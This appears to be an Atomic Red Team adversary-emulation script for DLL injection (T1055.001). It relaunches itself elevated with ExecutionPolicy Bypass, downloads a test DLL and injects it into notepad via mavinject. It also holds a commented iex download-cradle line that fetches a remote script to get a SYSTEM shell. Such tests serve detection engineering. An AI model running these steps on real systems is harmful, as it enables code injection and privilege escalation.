#Atomic Test #1 - Process Injection via mavinject.exe

if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process PowerShell -Verb RunAs "-NoProfile -ExecutionPolicy Bypass -Command `"cd '$pwd'; & '$PSCommandPath';`"";
    exit;
}

if (Test-Path C:\AtomicRedTeam\atomics\T1055.001\src\x64\T1055.001.dll) {
    $mypid = (Start-Process notepad -PassThru).id
    mavinject $mypid /INJECTRUNNING C:\AtomicRedTeam\atomics\T1055.001\src\x64\T1055.001.dll
    Stop-Process -processname notepad
    exit 0
}else{
    New-Item -Type Directory (split-path C:\AtomicRedTeam\atomics\T1055.001\src\x64\T1055.001.dll) -ErrorAction ignore | Out-Null
    Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.001/src/x64/T1055.001.dll" -OutFile "C:\AtomicRedTeam\atomics\T1055.001\src\x64\T1055.001.dll"
    
    $mypid = (Start-Process notepad -PassThru).id
    mavinject $mypid /INJECTRUNNING C:\AtomicRedTeam\atomics\T1055.001\src\x64\T1055.001.dll
    Stop-Process -processname notepad
    exit 1}

#Atomic Test #2 - WinPwn - Get SYSTEM shell - Bind System Shell using UsoClient DLL load technique

#iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/UsoDLL/Get-UsoClientDLLSystem.ps1')